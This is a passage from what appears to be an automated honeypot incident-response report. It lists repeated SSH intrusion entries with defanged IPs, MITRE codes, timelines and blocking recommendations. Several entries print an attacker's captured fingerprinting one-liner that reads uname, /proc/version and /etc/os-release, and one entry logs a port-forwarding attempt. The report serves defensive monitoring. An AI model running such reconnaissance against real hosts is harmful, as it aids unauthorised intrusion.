| **Last Seen** | 2026-09-04 07:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:26:25` | `cowrie.session.connect` |
| `2026-09-04 07:26:25` | `cowrie.client.version` |
| `2026-09-04 07:26:25` | `cowrie.client.kex` |
| `2026-09-04 07:26:26` | `cowrie.login.success` |
| `2026-09-04 07:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.49[.]166` to AbuseIPDB if not already reported
- [ ] Block `223.109.49[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-520e880104bd

| Field | Detail |
|---|---|
| **Source IP** | `223.109.49[.]166` |
| **First Seen** | 2026-09-04 07:26 |
| **Last Seen** | 2026-09-04 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:26:27` | `cowrie.session.connect` |
| `2026-09-04 07:26:27` | `cowrie.client.version` |
| `2026-09-04 07:26:27` | `cowrie.client.kex` |
| `2026-09-04 07:26:28` | `cowrie.login.success` |
| `2026-09-04 07:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.109.49[.]166` to AbuseIPDB if not already reported
- [ ] Block `223.109.49[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56153116dc68

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:27 |
| **Last Seen** | 2026-09-04 07:27 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:27:23` | `cowrie.session.connect` |
| `2026-09-04 07:27:28` | `cowrie.client.version` |
| `2026-09-04 07:27:28` | `cowrie.client.kex` |
| `2026-09-04 07:27:41` | `cowrie.login.success` |
| `2026-09-04 07:27:49` | `cowrie.session.params` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.success` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:49` | `cowrie.command.input` |
| `2026-09-04 07:27:53` | `cowrie.log.closed` |
| `2026-09-04 07:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daface89c706

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:28 |
| **Last Seen** | 2026-09-04 07:28 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:28:25` | `cowrie.session.connect` |
| `2026-09-04 07:28:28` | `cowrie.client.version` |
| `2026-09-04 07:28:28` | `cowrie.client.kex` |
| `2026-09-04 07:28:41` | `cowrie.login.success` |
| `2026-09-04 07:28:49` | `cowrie.session.params` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.success` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:49` | `cowrie.command.input` |
| `2026-09-04 07:28:52` | `cowrie.log.closed` |
| `2026-09-04 07:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1b23b9b5f1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:29 |
| **Last Seen** | 2026-09-04 07:29 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:29:21` | `cowrie.session.connect` |
| `2026-09-04 07:29:24` | `cowrie.client.version` |
| `2026-09-04 07:29:24` | `cowrie.client.kex` |
| `2026-09-04 07:29:38` | `cowrie.login.success` |
| `2026-09-04 07:29:44` | `cowrie.session.params` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.success` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:44` | `cowrie.command.input` |
| `2026-09-04 07:29:48` | `cowrie.log.closed` |
| `2026-09-04 07:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-822653ac120f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:30 |
| **Last Seen** | 2026-09-04 07:30 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:30:24` | `cowrie.session.connect` |
| `2026-09-04 07:30:28` | `cowrie.client.version` |
| `2026-09-04 07:30:28` | `cowrie.client.kex` |
| `2026-09-04 07:30:40` | `cowrie.login.success` |
| `2026-09-04 07:30:47` | `cowrie.session.params` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.success` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:47` | `cowrie.command.input` |
| `2026-09-04 07:30:50` | `cowrie.log.closed` |
| `2026-09-04 07:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1838110aa09c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:31 |
| **Last Seen** | 2026-09-04 07:31 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:31:18` | `cowrie.session.connect` |
| `2026-09-04 07:31:20` | `cowrie.client.version` |
| `2026-09-04 07:31:20` | `cowrie.client.kex` |
| `2026-09-04 07:31:31` | `cowrie.login.success` |
| `2026-09-04 07:31:37` | `cowrie.session.params` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.success` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:37` | `cowrie.command.input` |
| `2026-09-04 07:31:41` | `cowrie.log.closed` |
| `2026-09-04 07:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5208b68842ed

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:32 |
| **Last Seen** | 2026-09-04 07:32 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:32:16` | `cowrie.session.connect` |
| `2026-09-04 07:32:18` | `cowrie.client.version` |
| `2026-09-04 07:32:18` | `cowrie.client.kex` |
| `2026-09-04 07:32:31` | `cowrie.login.success` |
| `2026-09-04 07:32:38` | `cowrie.session.params` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.success` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:38` | `cowrie.command.input` |
| `2026-09-04 07:32:41` | `cowrie.log.closed` |
| `2026-09-04 07:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71b9a1454ab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:33 |
| **Last Seen** | 2026-09-04 07:33 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:33:06` | `cowrie.session.connect` |
| `2026-09-04 07:33:10` | `cowrie.client.version` |
| `2026-09-04 07:33:10` | `cowrie.client.kex` |
| `2026-09-04 07:33:22` | `cowrie.login.success` |
| `2026-09-04 07:33:29` | `cowrie.session.params` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.success` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:29` | `cowrie.command.input` |
| `2026-09-04 07:33:32` | `cowrie.log.closed` |
| `2026-09-04 07:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e717a5fd3316

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:33 |
| **Last Seen** | 2026-09-04 07:34 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:33:57` | `cowrie.session.connect` |
| `2026-09-04 07:34:00` | `cowrie.client.version` |
| `2026-09-04 07:34:00` | `cowrie.client.kex` |
| `2026-09-04 07:34:10` | `cowrie.login.success` |
| `2026-09-04 07:34:16` | `cowrie.session.params` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.success` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:16` | `cowrie.command.input` |
| `2026-09-04 07:34:20` | `cowrie.log.closed` |
| `2026-09-04 07:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0c51c945d7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:34 |
| **Last Seen** | 2026-09-04 07:35 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:34:54` | `cowrie.session.connect` |
| `2026-09-04 07:34:57` | `cowrie.client.version` |
| `2026-09-04 07:34:57` | `cowrie.client.kex` |
| `2026-09-04 07:35:11` | `cowrie.login.success` |
| `2026-09-04 07:35:18` | `cowrie.session.params` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.success` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:18` | `cowrie.command.input` |
| `2026-09-04 07:35:22` | `cowrie.log.closed` |
| `2026-09-04 07:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acacc18d070f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:35 |
| **Last Seen** | 2026-09-04 07:36 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:35:48` | `cowrie.session.connect` |
| `2026-09-04 07:35:50` | `cowrie.client.version` |
| `2026-09-04 07:35:50` | `cowrie.client.kex` |
| `2026-09-04 07:36:04` | `cowrie.login.success` |
| `2026-09-04 07:36:10` | `cowrie.session.params` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.success` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:10` | `cowrie.command.input` |
| `2026-09-04 07:36:12` | `cowrie.log.closed` |
| `2026-09-04 07:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d3a4f84e904

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:36 |
| **Last Seen** | 2026-09-04 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:36:32` | `cowrie.session.connect` |
| `2026-09-04 07:36:32` | `cowrie.client.version` |
| `2026-09-04 07:36:32` | `cowrie.client.kex` |
| `2026-09-04 07:36:33` | `cowrie.login.success` |
| `2026-09-04 07:36:33` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:36:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:36:33` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4758820cba9f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:36 |
| **Last Seen** | 2026-09-04 07:37 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:36:48` | `cowrie.session.connect` |
| `2026-09-04 07:36:50` | `cowrie.client.version` |
| `2026-09-04 07:36:50` | `cowrie.client.kex` |
| `2026-09-04 07:36:58` | `cowrie.login.success` |
| `2026-09-04 07:37:05` | `cowrie.session.params` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.success` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:05` | `cowrie.command.input` |
| `2026-09-04 07:37:09` | `cowrie.log.closed` |
| `2026-09-04 07:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
